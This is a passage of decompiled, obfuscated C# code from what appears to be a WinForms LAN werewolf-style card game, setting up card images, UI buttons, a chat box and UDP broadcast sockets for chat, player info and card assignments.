            this.Card4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            num2 = -9;
            continue;
          case 10:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_Card8);
            num2 = -10;
            continue;
          case 11:
            this.Card4.BackgroundImage = (Image) componentResourceManager.GetObject("Card4.BackgroundImage");
            num2 = -16;
            continue;
          case 12:
            this.Card4.SizeMode = PictureBoxSizeMode.StretchImage;
            num2 = -32;
            continue;
          case 13:
            this.Card3.BackgroundImage = (Image) componentResourceManager.GetObject("Card3.BackgroundImage");
            num2 = -8;
            continue;
          case 14:
            this.Card4.Size = new Size(130, 180);
            num2 = -12;
            continue;
          case 15:
            num1 = 18;
            num2 = -50;
            continue;
          case 16:
            this.Card4.Image = (Image) componentResourceManager.GetObject("Card4.Image");
            num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(27);
            continue;
          case 17:
            this.Card4.InitialImage = (Image) componentResourceManager.GetObject("Card4.InitialImage");
            num2 = -5;
            continue;
          case 18:
            goto label_1;
          default:
            goto label_20;
        }
      }
label_48:
      ((ISupportInitialize) this.Card10).EndInit();
      ((ISupportInitialize) this.Card12).EndInit();
      ((ISupportInitialize) this.Card11).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual PictureBox Card5
    {
      get => this._Card5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF476);
        PictureBox card5_1 = this._Card5;
        if ((card5_1 == null ? 1 : 0) == 0)
          card5_1.Click -= eventHandler;
        this._Card5 = value;
        PictureBox card5_2 = this._Card5;
        if ((card5_2 == null ? 1 : 0) != 0)
          return;
        card5_2.Click += eventHandler;
      }
    }

    internal virtual PictureBox Card6
    {
      get => this._Card6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF477);
        PictureBox card6_1 = this._Card6;
        if ((card6_1 == null ? 1 : 0) == 0)
          card6_1.Click -= eventHandler;
        this._Card6 = value;
        PictureBox card6_2 = this._Card6;
        if ((card6_2 == null ? 1 : 0) != 0)
          return;
        card6_2.Click += eventHandler;
      }
    }

    internal virtual PictureBox Card7
    {
      get => this._Card7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF478);
        PictureBox card7_1 = this._Card7;
        if ((card7_1 == null ? 1 : 0) == 0)
          card7_1.Click -= eventHandler;
        this._Card7 = value;
        PictureBox card7_2 = this._Card7;
        if ((card7_2 == null ? 1 : 0) != 0)
          return;
        card7_2.Click += eventHandler;
      }
    }

    internal virtual PictureBox Card2
    {
      get => this._Card2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF480);
        PictureBox card2_1 = this._Card2;
        if ((card2_1 == null ? 1 : 0) == 0)
          card2_1.Click -= eventHandler;
        this._Card2 = value;
        PictureBox card2_2 = this._Card2;
        if ((card2_2 == null ? 1 : 0) != 0)
          return;
        card2_2.Click += eventHandler;
      }
    }

    internal virtual PictureBox Card1
    {
      get => this._Card1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF482);
        PictureBox card1_1 = this._Card1;
        if ((card1_1 == null ? 1 : 0) == 0)
          card1_1.Click -= eventHandler;
        this._Card1 = value;
        PictureBox card1_2 = this._Card1;
        if ((card1_2 == null ? 1 : 0) != 0)
          return;
        card1_2.Click += eventHandler;
      }
    }

    internal virtual PictureBox Card3
    {
      get => this._Card3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47F);
        PictureBox card3_1 = this._Card3;
        if ((card3_1 == null ? 1 : 0) == 0)
          card3_1.Click -= eventHandler;
        this._Card3 = value;
        PictureBox card3_2 = this._Card3;
        if ((card3_2 == null ? 1 : 0) != 0)
          return;
        card3_2.Click += eventHandler;
      }
    }

    internal virtual PictureBox Card4
    {
      get => this._Card4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47E);
        PictureBox card4_1 = this._Card4;
        if ((card4_1 == null ? 1 : 0) == 0)
          card4_1.Click -= eventHandler;
        this._Card4 = value;
        PictureBox card4_2 = this._Card4;
        if ((card4_2 == null ? 1 : 0) != 0)
          return;
        card4_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("BindingSource1")]
    internal virtual BindingSource BindingSource1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button SendButton
    {
      get => this._SendButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF469);
        Button sendButton1 = this._SendButton;
        if ((sendButton1 == null ? 1 : 0) == 0)
          sendButton1.Click -= eventHandler;
        this._SendButton = value;
        Button sendButton2 = this._SendButton;
        if ((sendButton2 == null ? 1 : 0) != 0)
          return;
        sendButton2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("MessageInput")]
    internal virtual TextBox MessageInput { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Settings
    {
      get => this._Settings;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF484);
        Button settings1 = this._Settings;
        if ((settings1 == null ? 1 : 0) == 0)
          settings1.Click -= eventHandler;
        this._Settings = value;
        Button settings2 = this._Settings;
        if ((settings2 == null ? 1 : 0) != 0)
          return;
        settings2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ChatBox")]
    internal virtual RichTextBox ChatBox { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual System.Windows.Forms.Timer GameTime
    {
      get => this._GameTime;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF486);
        System.Windows.Forms.Timer gameTime1 = this._GameTime;
        if ((gameTime1 == null ? 1 : 0) == 0)
          gameTime1.Tick -= eventHandler;
        this._GameTime = value;
        System.Windows.Forms.Timer gameTime2 = this._GameTime;
        if ((gameTime2 == null ? 1 : 0) != 0)
          return;
        gameTime2.Tick += eventHandler;
      }
    }

    internal virtual Label TimerLabel
    {
      get => this._TimerLabel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF485);
        Label timerLabel1 = this._TimerLabel;
        if ((timerLabel1 == null ? 1 : 0) == 0)
          timerLabel1.Click -= eventHandler;
        this._TimerLabel = value;
        Label timerLabel2 = this._TimerLabel;
        if ((timerLabel2 == null ? 1 : 0) != 0)
          return;
        timerLabel2.Click += eventHandler;
      }
    }

    internal virtual CheckBox ReadyToStart
    {
      get => this._ReadyToStart;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF497);
        CheckBox readyToStart1 = this._ReadyToStart;
        if ((readyToStart1 == null ? 1 : 0) == 0)
          readyToStart1.CheckedChanged -= eventHandler;
        this._ReadyToStart = value;
        CheckBox readyToStart2 = this._ReadyToStart;
        if ((readyToStart2 == null ? 1 : 0) != 0)
          return;
        readyToStart2.CheckedChanged += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PlayerName2")]
    internal virtual Label PlayerName2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PlayerName3")]
    internal virtual Label PlayerName3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PlayerName1")]
    internal virtual Label PlayerName1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PlayerName4")]
    internal virtual Label PlayerName4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button About
    {
      get => this._About;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49E);
        Button about1 = this._About;
        if ((about1 == null ? 1 : 0) == 0)
          about1.Click -= eventHandler;
        this._About = value;
        Button about2 = this._About;
        if ((about2 == null ? 1 : 0) != 0)
          return;
        about2.Click += eventHandler;
      }
    }

    internal virtual Button Instructions
    {
      get => this._Instructions;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49F);
        Button instructions1 = this._Instructions;
        if ((instructions1 == null ? 1 : 0) == 0)
          instructions1.Click -= eventHandler;
        this._Instructions = value;
        Button instructions2 = this._Instructions;
        if ((instructions2 == null ? 1 : 0) != 0)
          return;
        instructions2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("TurnLabel")]
    internal virtual Label TurnLabel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button VoteMenuButton
    {
      get => this._VoteMenuButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A0);
        Button voteMenuButton1 = this._VoteMenuButton;
        if ((voteMenuButton1 == null ? 1 : 0) == 0)
          voteMenuButton1.Click -= eventHandler;
        this._VoteMenuButton = value;
        Button voteMenuButton2 = this._VoteMenuButton;
        if ((voteMenuButton2 == null ? 1 : 0) != 0)
          return;
        voteMenuButton2.Click += eventHandler;
      }
    }

    internal virtual Button RestartRoundButton
    {
      get => this._RestartRoundButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A1);
        Button restartRoundButton1 = this._RestartRoundButton;
        if ((restartRoundButton1 == null ? 1 : 0) == 0)
          restartRoundButton1.Click -= eventHandler;
        this._RestartRoundButton = value;
        Button restartRoundButton2 = this._RestartRoundButton;
        if ((restartRoundButton2 == null ? 1 : 0) != 0)
          return;
        restartRoundButton2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PlayerName5")]
    internal virtual Label PlayerName5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox Card8
    {
      get => this._Card8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47D);
        PictureBox card8_1 = this._Card8;
        if ((card8_1 == null ? 1 : 0) == 0)
          card8_1.Click -= eventHandler;
        this._Card8 = value;
        PictureBox card8_2 = this._Card8;
        if ((card8_2 == null ? 1 : 0) != 0)
          return;
        card8_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PlayerName6")]
    internal virtual Label PlayerName6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox Card9
    {
      get => this._Card9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47C);
        PictureBox card9_1 = this._Card9;
        if ((card9_1 == null ? 1 : 0) == 0)
          card9_1.Click -= eventHandler;
        this._Card9 = value;
        PictureBox card9_2 = this._Card9;
        if ((card9_2 == null ? 1 : 0) != 0)
          return;
        card9_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PlayerName7")]
    internal virtual Label PlayerName7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox Card10
    {
      get => this._Card10;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47B);
        PictureBox card10_1 = this._Card10;
        if ((card10_1 == null ? 1 : 0) == 0)
          card10_1.Click -= eventHandler;
        this._Card10 = value;
        PictureBox card10_2 = this._Card10;
        if ((card10_2 == null ? 1 : 0) != 0)
          return;
        card10_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PlayerName9")]
    internal virtual Label PlayerName9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox Card12
    {
      get => this._Card12;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF479);
        PictureBox card12_1 = this._Card12;
        if ((card12_1 == null ? 1 : 0) == 0)
          card12_1.Click -= eventHandler;
        this._Card12 = value;
        PictureBox card12_2 = this._Card12;
        if ((card12_2 == null ? 1 : 0) != 0)
          return;
        card12_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PlayerName8")]
    internal virtual Label PlayerName8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual PictureBox Card11
    {
      get => this._Card11;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47A);
        PictureBox card11_1 = this._Card11;
        if ((card11_1 == null ? 1 : 0) == 0)
          card11_1.Click -= eventHandler;
        this._Card11 = value;
        PictureBox card11_2 = this._Card11;
        if ((card11_2 == null ? 1 : 0) != 0)
          return;
        card11_2.Click += eventHandler;
      }
    }

    internal virtual Button CardInfoButton
    {
      get => this._CardInfoButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF4A2);
        Button cardInfoButton1 = this._CardInfoButton;
        if ((cardInfoButton1 == null ? 1 : 0) == 0)
          cardInfoButton1.Click -= eventHandler;
        this._CardInfoButton = value;
        Button cardInfoButton2 = this._CardInfoButton;
        if ((cardInfoButton2 == null ? 1 : 0) != 0)
          return;
        cardInfoButton2.Click += eventHandler;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF466(
      object _param1,
      EventArgs _param2)
    {
label_2:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7D.\uE123\uEF7F\uEEEB\uE230\uE2DD\uE2EA\uF079\uF000\uF4BC\uF8BE\uF536\uE7F1(50);
label_1:
      while (true)
      {
        num1 ^= 50;
        switch (num1 + 49)
        {
          case 0:
            this.ListOfPlayerNameLabels.Add(this.PlayerName6);
            this.ListOfPlayerNameLabels.Add(this.PlayerName7);
            num1 = -47;
            continue;
          case 1:
            this.Size = new Size(200, 23);
            this.Card1.Enabled = false;
            num1 = -42;
            continue;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.SendVotesToEndRound);
            num1 = -29;
            continue;
          case 3:
            this.CharacterList.Add("Seer");
            this.CharacterList.Add("Robber");
            num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7D.\uE123\uEF7F\uEEEB\uE230\uE2DD\uE2EA\uF079\uF000\uF4BC\uF8BE\uF536\uE7F1(51);
            continue;
          case 4:
            this.DoubleBuffered = true;
            this.MinimumSize = new Size(1600, 900);
            num1 = -30;
            continue;
          case 5:
            this.CharacterList.Add("TroubleMaker");
            this.TurnLabel.Text = "";
            num1 = -31;
            continue;
          case 6:
            this.ListOfPlayerNameLabels.Add(this.PlayerName2);
            this.ListOfPlayerNameLabels.Add(this.PlayerName3);
            num1 = -27;
            continue;
          case 7:
            this.ListOfPlayerCards.Add(this.Card12);
            this.MiddleCardPicutreList.Add(this.Card5);
            num1 = -24;
            continue;
          case 8:
            this.ListOfPlayerNameLabels.Add(this.PlayerName4);
            this.ListOfPlayerNameLabels.Add(this.PlayerName5);
            num1 = -3;
            continue;
          case 9:
            this.ListOfPlayerCards.Add(this.Card1);
            this.ListOfPlayerCards.Add(this.Card2);
            num1 = -45;
            continue;
          case 10:
            this.ListOfPlayerCards.Add(this.Card10);
            this.ListOfPlayerCards.Add(this.Card11);
            num1 = -28;
            continue;
          case 11:
            this.MiddleCardPicutreList.Add(this.Card6);
            this.MiddleCardPicutreList.Add(this.Card7);
            num1 = -19;
            continue;
          case 12:
            goto label_16;
          case 13:
            this.ListOfPlayerCards.Add(this.Card8);
            this.ListOfPlayerCards.Add(this.Card9);
            num1 = -21;
            continue;
          case 14:
            VBMath.Randomize();
            this.randomIntegerID = checked ((int) Conversion.Int((float) unchecked (1000000.0 * (double) VBMath.Rnd() + 1000.0)));
            this.thisPlayer.SetUniquePlayerID(this.randomIntegerID.ToString());
            num1 = -48;
            continue;
          case 15:
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF468();
            this.AcceptButton = (IButtonControl) this.SendButton;
            num1 = -23;
            continue;
          case 16:
            this.CharacterList.Add("WereWolf");
            this.CharacterList.Add("WereWolf");
            num1 = -32;
            continue;
          case 17:
            this.PlayerName1.Text = "Your Card";
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF467();
            num1 = -20;
            continue;
          case 18:
            this.ListOfPlayerCards.Add(this.Card3);
            this.ListOfPlayerCards.Add(this.Card4);
            num1 = -18;
            continue;
          case 19:
            this.thisPlayer.SetPlayerName("FreshBait" + this.randomIntegerID.ToString());
            this.PlayerList.Add(this.thisPlayer);
            num1 = -46;
            continue;
          case 20:
            this.ListOfPlayerNameLabels.Add(this.PlayerName8);
            this.ListOfPlayerNameLabels.Add(this.PlayerName9);
            num1 = -22;
            continue;
          case 21:
            goto label_30;
          default:
            goto label_2;
        }
      }
label_16:
      int num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(53);
      while (true)
      {
        switch ((num2 ^ 48) + 48)
        {
          case 0:
            this.ListOfPlayerNameLabels.Add(this.PlayerName1);
            num2 = -29;
            continue;
          case 1:
            this.ChatBox.Font = new Font(this.ChatBox.Font.FontFamily, (float) this.thisPlayer.GetFontSize);
            num2 = -30;
            continue;
          case 2:
            num2 = -32;
            continue;
          case 3:
            num1 = -25;
            num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(23);
            continue;
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48E);
            num2 = -28;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_16;
        }
      }
label_30:
      this.VMF = new VoteMenuForm(this.PlayerList, this.AlreadyVoted);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF467()
    {
label_5:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7D.\uE123\uEF7F\uEEEB\uE230\uE2DD\uE2EA\uF079\uF000\uF4BC\uF8BE\uF536\uE7F1(47);
      int num2 = -8;
      while (true)
      {
        switch ((num2 ^ 63) + 60)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_GameTime);
            num2 = -5;
            continue;
          case 1:
            goto label_5;
          case 2:
            switch (num1 + 48)
            {
              case 0:
                num1 = -32;
                goto label_1;
              case 1:
                num1 = -44;
                goto label_1;
              case 2:
                this.sendingClientIsReady.EnableBroadcast = true;
                num1 = -21;
                goto label_1;
              case 3:
                this.sendingAssignedCards = new UdpClient("255.255.255.255", 9657);
                num1 = -30;
                goto label_1;
              case 4:
                this.sendingClientChat.EnableBroadcast = true;
                num1 = -27;
                goto label_1;
              case 5:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName3);
                num1 = -31;
                goto label_1;
              case 6:
                this.sendingUpdateCardChanges = new UdpClient("255.255.255.255", 9658);
                num1 = -42;
                goto label_1;
              case 7:
                this.sendingClientChat = new UdpClient("255.255.255.255", 9654);
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7D.\uE123\uEF7F\uEEEB\uE230\uE2DD\uE2EA\uF079\uF000\uF4BC\uF8BE\uF536\uE7F1(50);
                goto label_1;
              case 8:
                num1 = -41;
                goto label_1;
              case 9:
                this.sendingClient = new UdpClient("255.255.255.255", 9653);
                num1 = -29;
                goto label_1;
              case 10:
                num1 = -26;
                goto label_1;
              case 11:
                this.sendingClientPlayerInfo = new UdpClient("255.255.255.255", 9655);
                num1 = -22;
                goto label_1;
              case 12:
                this.sendingAssignedCards.EnableBroadcast = true;
                num1 = -43;
                goto label_1;
              case 13:
                this.sendingUpdateCardChanges.EnableBroadcast = true;
                num1 = -20;
                goto label_1;
              case 14:
                this.sendingClientIsReady = new UdpClient("255.255.255.255", 9656);
                num1 = -25;
                goto label_1;
              case 15:
                num1 = -24;
                goto label_1;
              case 16:
                this.sendingClientPlayerInfo.EnableBroadcast = true;
                num1 = -18;
                goto label_1;
              case 17:
                num1 = -23;
                goto label_1;
              case 18:
                this.sendingClient.EnableBroadcast = true;
                num1 = -28;
                goto label_1;
              case 19:
                goto label_25;
              default:
                num2 = -6;
                continue;
            }
          case 3:
label_1:
            num1 ^= 52;
            break;
        }
        num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
      }
label_25:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF468()
    {
label_2:
      int num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
label_1:
      while (true)
      {
        num1 ^= 60;
        object localEP1;
        object localEP2;
        object localEP3;
        object localEP4;
        object localEP5;
        object localEP6;
        switch (num1 + 61)
        {
          case 0:
            this.receivingAssignedCards.ExclusiveAddressUse = false;
            this.receivingAssignedCards.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            num1 = -6;
            continue;
          case 1:
            goto label_4;
          case 2:
            ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46C()));
            this.receivingClientChat = new UdpClient();
            num1 = -11;
            continue;
          case 3:
            this.receivingAssignedCards.Client.Bind((EndPoint) localEP1);
            num1 = -12;
            continue;
          case 4:
            localEP2 = (object) new IPEndPoint(0L, 9653);
            localEP3 = (object) new IPEndPoint(0L, 9654);
            localEP4 = (object) new IPEndPoint(0L, 9655);
            num1 = -18;
            continue;
          case 5:
            ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.RecieverAssigningCards()));
            this.receivingUpdateCardChanges = new UdpClient();
            this.receivingUpdateCardChanges.ExclusiveAddressUse = false;
            num1 = -10;
            continue;
          case 6:
            this.receivingClientChat.ExclusiveAddressUse = false;
            this.receivingClientChat.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            num1 = -16;
            continue;
          case 7:
            this.receivingUpdateCardChanges.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            num1 = -14;
            continue;
          case 8:
            this.receivingClientPlayerInfo.Client.Bind((EndPoint) localEP4);
            ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46A()));
            num1 = -20;
            continue;
          case 9:
            this.receivingClientChat.Client.Bind((EndPoint) localEP3);
            num1 = -23;
            continue;
          case 10:
            this.receivingClientPlayerInfo.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            num1 = -9;
            continue;
          case 11:
            this.receivingUpdateCardChanges.Client.Bind((EndPoint) localEP5);
            ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF49A()));
            num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
            continue;
          case 12:
            this.receivingClientIsReady.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            this.receivingClientIsReady.Client.Bind((EndPoint) localEP6);
            num1 = -19;
            continue;
          case 13:
            this.receivingClientIsReady = new UdpClient();
            this.receivingClientIsReady.ExclusiveAddressUse = false;
            num1 = -13;
            continue;
          case 14:
            ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF498()));
            this.receivingAssignedCards = new UdpClient();
            num1 = -1;
            continue;
          case 15:
            localEP6 = (object) new IPEndPoint(0L, 9656);
            localEP1 = (object) new IPEndPoint(0L, 9657);
            localEP5 = (object) new IPEndPoint(0L, 9658);
            num1 = -17;
            continue;
          case 16:
            this.receivingClient = new UdpClient();
            this.receivingClient.ExclusiveAddressUse = false;
            num1 = -24;
            continue;
          case 17:
            this.receivingClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            this.receivingClient.Client.Bind((EndPoint) localEP2);
            num1 = -7;
            continue;
          case 18:
            ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46B()));
            this.receivingClientPlayerInfo = new UdpClient();
            this.receivingClientPlayerInfo.ExclusiveAddressUse = false;
            num1 = -15;
            continue;
          case 19:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46C);
            num1 = -22;
            continue;
          case 20:
            goto label_29;
          default:
            goto label_2;
        }
      }
label_4:
      int getPlayerNumber = this.thisPlayer.GetPlayerNumber;
label_6:
      int num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
      string str;
      byte[] bytes;
      while (true)
      {
        switch ((num2 ^ 63) + 57)
        {
          case 0:
            num1 = -21;
            num2 = -12;
            continue;
          case 1:
            str = getPlayerNumber.ToString();
            num2 = -11;
            continue;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47D);
            num2 = -10;
            continue;
          case 3:
            bytes = Encoding.ASCII.GetBytes(this.thisPlayer.GetPlayerName + "<>" + this.thisPlayer.GetCardType + "<>" + str + "<>" + this.randomIntegerID.ToString() + "<>" + this.isMaster.ToString() + "<>InitialSend");
            num2 = -8;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_6;
        }
      }
